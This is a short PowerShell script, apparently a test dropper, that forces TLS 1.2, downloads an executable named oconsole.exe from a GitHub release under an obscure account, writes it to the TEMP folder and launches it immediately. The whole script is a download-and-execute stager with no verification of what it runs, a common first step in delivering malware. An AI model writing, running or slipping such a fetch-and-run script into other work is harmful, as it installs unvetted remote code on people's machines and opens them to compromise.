[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$destino = $env:TEMP\oconsole.exe
$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"

Invoke-WebRequest -Uri $url -OutFile $destino
Start-Process -FilePath $destino
